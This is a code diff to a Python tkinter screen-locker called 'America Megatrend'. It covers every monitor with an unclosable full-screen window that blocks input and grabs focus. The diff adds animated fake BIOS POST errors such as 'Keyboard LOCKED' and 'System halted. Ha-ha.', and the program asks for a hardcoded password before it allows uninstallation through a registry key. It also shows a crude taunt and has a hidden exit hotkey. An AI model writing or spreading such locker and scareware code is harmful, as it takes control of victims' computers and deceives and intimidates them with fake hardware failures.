@@ -1,21 +1,41 @@
 import tkinter as tk
 import winreg
 import sys
+import random
 from screeninfo import get_monitors
+
 #настройки
 APP_NAME = "America Megatrend"
-UNINSTALL_PASSWORD = "5225"   
+UNINSTALL_PASSWORD = "5225"
 REG_PATH = r"Software\AmericaMegatrend"
 REG_NAME = "AllowUninstall"
-EXIT_HOTKEY = "<Control-=>"  
+EXIT_HOTKEY = "<Control-=>"
+
+# --- настройки анимации ---
+MATRIX_CHARS = "01АМИBIOS<>#$%&*+=?ABCDEF0123456789"
+GLITCH_COLORS = ["red", "#ff3333", "#ff6600", "#ffcc00", "#ff0044", "#cc0000"]
+FRAME_DELAY = 60  # мс между кадрами
+POST_LINES = [
+    "American Megatrends BIOS (C) 1985-2026",
+    "Detecting IDE drives ... FAIL",
+    "CPU: Unknown @ 0.00 GHz",
+    "Memory Test : ERROR",
+    "Keyboard ..... LOCKED",
+    "Loading MEGATREND.SYS ...",
+    "Access denied. Enter password.",
+    "System halted. Ha-ha.",
+]
+
 
 def block_event(event):
     return "break"
+
 
 def normal_exit(event=None):
     for w in windows:
         w.destroy()
     sys.exit(0)
+
 
 def allow_uninstall():
     password = entry_password.get()
@@ -44,7 +64,85 @@ def allow_uninstall():
             text=f"Ошибка записи в реестр:\n{e}",
             fg="red"
         )
+
+
+class ScreenAnimator:
+    """Живой глючащий BIOS/POST-экран поверх окна."""
+
+    def __init__(self, win, canvas, width, height):
+        self.win = win
+        self.canvas = canvas
+        self.width = width
+        self.height = height
+        self.font_size = 16
+        self.col_w = self.font_size
+        self.cols = max(1, width // self.col_w)
+        # у каждой колонки matrix-дождя своя стартовая высота и скорость
+        self.drops = [random.randint(-height, 0) for _ in range(self.cols)]
+        self.speeds = [random.randint(self.font_size, self.font_size * 3)
+                       for _ in range(self.cols)]
+        self.post_index = 0
+        self.tick = 0
+
+    def step(self):
+        c = self.canvas
+        c.delete("fx")
+
+        # matrix-дождь
+        for i in range(self.cols):
+            x = i * self.col_w
+            y = self.drops[i]
+            ch = random.choice(MATRIX_CHARS)
+            c.create_text(
+                x, y, text=ch, fill="#004400", anchor="nw",
+                font=("Courier", self.font_size), tags="fx"
+            )
+            # яркая «голова» капли
+            c.create_text(
+                x, y, text=random.choice(MATRIX_CHARS), fill="#00ff66",
+                anchor="nw", font=("Courier", self.font_size), tags="fx"
+            )
+            self.drops[i] += self.speeds[i]
+            if self.drops[i] > self.height + random.randint(0, self.height):
+                self.drops[i] = random.randint(-self.height, 0)
+
+        # бегущий фейковый POST-лог (левый верхний угол)
+        visible = 6
+        for n in range(visible):
+            idx = (self.post_index + n) % len(POST_LINES)
+            c.create_text(
+                12, 12 + n * (self.font_size + 4),
+                text=POST_LINES[idx], fill="#33ff33", anchor="nw",
+                font=("Courier", self.font_size - 2), tags="fx"
+            )
+        self.tick += 1
+        if self.tick % 8 == 0:
+            self.post_index = (self.post_index + 1) % len(POST_LINES)
+
+        # глючащий заголовок по центру: дрожание + смена цвета
+        jitter_x = random.randint(-4, 4)
+        jitter_y = random.randint(-3, 3)
+        c.create_text(
+            self.width // 2 + jitter_x, self.height // 2 + jitter_y,
+            text="AMERICA MEGATREND",
+            fill=random.choice(GLITCH_COLORS),
+            font=("Arial", 40, "bold"), tags="fx"
+        )
+        # «тень»-двойник для эффекта glitch
+        if random.random() < 0.5:
+            c.create_text(
+                self.width // 2 + jitter_x + random.randint(-8, 8),
+                self.height // 2 + jitter_y,
+                text="AMERICA MEGATREND",
+                fill="#00ffff", font=("Arial", 40, "bold"), tags="fx"
+            )
+
+        c.tag_lower("fx")  # держим интерактивные виджеты поверх анимации
+        self.win.after(FRAME_DELAY, self.step)
+
+
 windows = []
+animators = []
 monitors = get_monitors()
 for i, m in enumerate(monitors):
     win = tk.Tk() if i == 0 else tk.Toplevel()
@@ -56,23 +154,24 @@ for i, m in enumerate(monitors):
     win.bind(EXIT_HOTKEY, normal_exit)
     win.protocol("WM_DELETE_WINDOW", lambda: None)
 
-    frame = tk.Frame(win, bg="black")
-    frame.pack(expand=True, fill="both")
-
-    label = tk.Label(
-        frame,
-        text="AMERICA MEGATREND",
-        fg="red",
-        bg="black",
-        font=("Arial", 36)
+    canvas = tk.Canvas(
+        win, width=m.width, height=m.height,
+        bg="black", highlightthickness=0
     )
-    label.pack(expand=True)
+    canvas.pack(expand=True, fill="both")
+
+    animator = ScreenAnimator(win, canvas, m.width, m.height)
     windows.append(win)
+    animators.append((canvas, animator))
 
 main = windows[0]
-main_frame = main.winfo_children()[0]
+main_canvas = animators[0][0]
+
+# --- интерактивные виджеты поверх анимации на главном мониторе ---
+panel = tk.Frame(main_canvas, bg="black")
+
 label_info = tk.Label(
-    main_frame,
+    panel,
     text="Для удаления программы введите пароль",
     fg="white",
     bg="black",
@@ -81,7 +180,7 @@ label_info = tk.Label(
 label_info.pack(pady=20)
 
 entry_password = tk.Entry(
-    main_frame,
+    panel,
     font=("Arial", 20),
     show="*",
     width=20,
@@ -90,7 +189,7 @@ entry_password = tk.Entry(
 entry_password.pack(pady=10)
 
 button_uninstall = tk.Button(
-    main_frame,
+    panel,
     text="Подтвердить удаление",
     command=allow_uninstall,
     font=("Arial", 18),
@@ -102,7 +201,7 @@ button_uninstall = tk.Button(
 button_uninstall.pack(pady=20)
 
 label_status = tk.Label(
-    main_frame,
+    panel,
     text="",
     fg="white",
     bg="black",
@@ -111,16 +210,25 @@ label_status = tk.Label(
 label_status.pack(pady=20)
 
 label_hint = tk.Label(
-    main_frame,
+    panel,
     text="сосал?",
     fg="gray",
     bg="black",
     font=("Arial", 12)
 )
-label_hint.pack(side="bottom", pady=20)
+label_hint.pack(pady=20)
 
+# панель ниже центра, чтобы не перекрывать глючащий заголовок
+monitors_main = monitors[0]
+main_canvas.create_window(
+    monitors_main.width // 2,
+    int(monitors_main.height * 0.72),
+    window=panel
+)
 
-
+# запускаем анимацию на всех мониторах
+for canvas, animator in animators:
+    animator.step()
 
 main.grab_set()
 main.mainloop()
